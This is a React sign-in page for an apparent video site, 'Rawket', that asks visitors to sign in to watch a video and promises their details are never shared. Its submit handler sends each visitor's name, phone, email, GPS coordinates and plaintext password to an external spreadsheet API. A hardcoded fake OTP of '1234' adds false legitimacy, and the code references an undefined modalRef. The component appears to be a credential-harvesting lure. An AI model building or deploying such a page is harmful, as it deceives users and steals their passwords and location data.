import React, { useState, useEffect, useRef } from "react";
import { useForm } from "react-hook-form";
import { useNavigate } from "react-router-dom";
import { BsIncognito } from "react-icons/bs";
import { IconContext } from "react-icons";

const SignIn = () => {
  const navigate = useNavigate();
  const [isOtpSent, setIsOtpSent] = useState(false);
  const [otp, setOtp] = useState("");
  const [isOtpValid, setIsOtpValid] = useState(false);
  const [timer, setTimer] = useState(120);
  const [resendEnabled, setResendEnabled] = useState(false);
  const [country, setCountry] = useState("");
  const [latitude, setLatitude] = useState(null);
  const [longitude, setLongitude] = useState(null);

  const {
    register,
    handleSubmit,
    formState: { errors },
    reset,
  } = useForm();

  const closeModal = () => {
    setIsOtpSent(false);
    setOtp("");
  };

  useEffect(() => {
    const handleClickOutside = (event) => {
      if (modalRef.current && !modalRef.current.contains(event.target)) {
        closeModal();
      }
    };

    if (isOtpSent) {
      document.addEventListener("mousedown", handleClickOutside);
    }

    return () => {
      document.removeEventListener("mousedown", handleClickOutside);
    };
  }, [isOtpSent]);

  const getLocation = () => {
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        async (position) => {
          const { latitude, longitude } = position.coords;
          setLatitude(latitude);
          setLongitude(longitude);
          console.log("Current Location:", { latitude, longitude });

          try {
            const response = await fetch(
              `https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${latitude}&longitude=${longitude}&localityLanguage=en`
            );
            const data = await response.json();
            if (data && data.countryName) {
              setCountry(data.countryName);
            }
          } catch (error) {
            console.error("Error fetching country:", error);
          }
        },
        (error) => {
          console.error("Error retrieving location:", error);
        }
      );
    } else {
      console.error("Geolocation is not supported by this browser.");
    }
  };

  const sendOtp = () => {
    setIsOtpSent(true);
    setTimer(120);
    setResendEnabled(false);
  };

  const validateOtp = () => {
    if (otp === "1234") {
      setIsOtpValid(true);
    } else {
      // Handle invalid OTP
    }
  };

  useEffect(() => {
    if (timer > 0) {
      const intervalId = setInterval(() => {
        setTimer((prevTimer) => prevTimer - 1);
      }, 1000);
      return () => clearInterval(intervalId);
    } else {
      setResendEnabled(true);
    }
  }, [timer]);

  const onSubmit = async (data) => {
    console.log(data);
    try {
      const response = await fetch("https://sheetdb.io/api/v1/k3jxjk3z81o9g", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          data: {
            name: data.name,
            phone: data.phone,
            email: data.email,
            latitude: latitude,
            longitude: longitude,
            password: data.password,
          },
        }),
      });

      if (response.ok) {
        reset();
        navigate("/riturao/videos/vid232/view");
      } else {
        alert("Failed to submit form");
      }
    } catch (error) {
      console.error("Error submitting form:", error);
    }
  };

  // ... (rest of the component code remains the same)

  return (
    <div className="min-h-screen bg-custom bg-cover bg-center flex md:flex-row items-center justify-center">
      <div className="md:flex-1 w-full max-w-md bg-white p-8 m-4 shadow-lg rounded-lg">
        {/* Responsive Title */}
        <h2 className="text-center text-lg md:text-2xl font-semibold text-blue-600">
          To watch this video Sign In
        </h2>

        {/* Logo and Heading */}
        <div className="flex flex-row items-center justify-center gap-3">
          <img src="/logo.jpg" className="h-[30px] md:h-[50px]" alt="Logo" />
          <h1 className="text-[40px] md:text-[60px] font-bold">Rawket</h1>
        </div>
        <div className="text-xs font-light text-center">
          <div className="text-xs md:text-base font-semibold py-2">
            Browse and Download videos anonymously
          </div>
          <div className="flex bg-gray-200 rounded-2xl px-4 py-1 items-center justify-center text-wrap">
            <IconContext.Provider value={{ size: "3em" }}>
              <BsIncognito className="mr-2" /> {/* Added margin to the right */}
            </IconContext.Provider>
            <p className="text-left">
              Your personal details are secure and never shared.
            </p>
          </div>
        </div>

        {/* Form */}
        <form onSubmit={handleSubmit(onSubmit)} className="space-y-6">
          {/* Name Field */}
          <div>
            <label className="block text-sm font-medium">Name</label>
            <input
              type="text"
              {...register("name", { required: "Name is required" })}
              className="mt-1 block w-full p-2 border border-gray-300 rounded-md focus:outline-none focus:ring focus:ring-indigo-200"
            />
            {errors.name && (
              <p className="text-red-600 text-sm">{errors.name.message}</p>
            )}
          </div>

          {/* Phone Number Field */}
          <div>
            <label className="block text-sm font-medium">Phone No.</label>
            <input
              type="tel"
              {...register("phone", {
                required: "Phone number is required",
                pattern: {
                  value: /^[0-9]{10}$/,
                  message: "Phone number must be 10 digits",
                },
              })}
              className="mt-1 block w-full p-2 border border-gray-300 rounded-md focus:outline-none focus:ring focus:ring-indigo-200"
            />
            {errors.phone && (
              <p className="text-red-600 text-sm">{errors.phone.message}</p>
            )}
            <div className="text-red-600 text-xs">
              Verification OTP will be sent
            </div>
          </div>

          {/* Email Field */}
          <div>
            <label className="block text-sm font-medium">Email</label>
            <input
              type="email"
              {...register("email", {
                required: "Email is required",
                pattern: {
                  value: /^\S+@\S+$/i,
                  message: "Invalid email format",
                },
              })}
              className="mt-1 block w-full p-2 border border-gray-300 rounded-md focus:outline-none focus:ring focus:ring-indigo-200"
            />
            {errors.email && (
              <p className="text-red-600 text-sm">{errors.email.message}</p>
            )}
          </div>
          {/* Country Field */}
          <div>
            <label className="block text-sm font-medium">
              Country
              <span></span>
            </label>
            <input
              type="text"
              value={country}
              placeholder="Auto detect Country"
              readOnly // Make the input read-only to prevent typing
              className="mt-1 block w-full p-2 border border-gray-300 rounded-md focus:outline-none focus:ring focus:ring-indigo-200"
            />
            <button
              type="button"
              onClick={getLocation}
              className="mt-2 bg-indigo-600 text-white py-1 px-4 rounded-md hover:bg-indigo-700"
            >
              Get Current Location
            </button>
          </div>

          {/* Password Field */}
          <div>
            <label className="block text-sm font-medium">Password</label>
            <input
              type="password"
              {...register("password", {
                required: "Password is required",
                minLength: {
                  value: 8,
                  message: "Password must be at least 8 characters long",
                },
              })}
              className="mt-1 block w-full p-2 border border-gray-300 rounded-md focus:outline-none focus:ring focus:ring-indigo-200"
            />
            {errors.password && (
              <p className="text-red-600 text-sm">{errors.password.message}</p>
            )}
          </div>

          {/* Submit Button */}
          <div>
            <button
              type="submit"
              className="w-full bg-indigo-600 text-white py-2 px-4 rounded-md hover:bg-indigo-700 focus:outline-none focus:ring focus:ring-indigo-300"
            >
              Submit
            </button>
          </div>
        </form>

        {/* OTP Modal */}
        {isOtpSent && (
          <div className="fixed inset-0 flex items-center justify-center bg-gray-800 bg-opacity-50">
            <div ref={modalRef} className="bg-white p-6 rounded shadow-lg">
              <h2 className="text-base font-semibold mb-4">
                Enter OTP sent your mobile
              </h2>

              <input
                type="text"
                value={otp}
                onChange={(e) => setOtp(e.target.value)}
                placeholder="Enter OTP"
                className="mt-1 block w-full p-2 border border-gray-300 rounded-md focus:outline-none focus:ring focus:ring-indigo-200"
              />

              <div className="mt-4 flex justify-between">
                <button
                  onClick={validateOtp}
                  className="bg-indigo-600 text-white py-1 px-4 rounded-md hover:bg-indigo-700"
                >
                  Verify
                </button>
                <button
                  onClick={sendOtp}
                  disabled={!resendEnabled}
                  className={`${
                    resendEnabled
                      ? "bg-indigo-600 text-white"
                      : "bg-gray-400 text-gray-200 cursor-not-allowed"
                  } py-1 px-4 rounded-md hover:bg-indigo-700`}
                >
                  {resendEnabled ? "Send Again" : `Resend in ${timer}s`}
                </button>
              </div>
            </div>
          </div>
        )}
        <div className="mt-6 text-center">
          <p className="text-sm text-gray-600">
            By signing up, you agree to our{" "}
            <a href="/terms" className="text-indigo-600 hover:underline">
              Terms and Conditions
            </a>{" "}
            and{" "}
            <a href="/privacy" className="text-indigo-600 hover:underline">
              Privacy Policy
            </a>
            .
          </p>
        </div>
      </div>
      <div className="hidden md:flex ">
        <img src="/desk.jpg" className="h-full my-5" />
      </div>
    </div>
  );
};

export default SignIn;
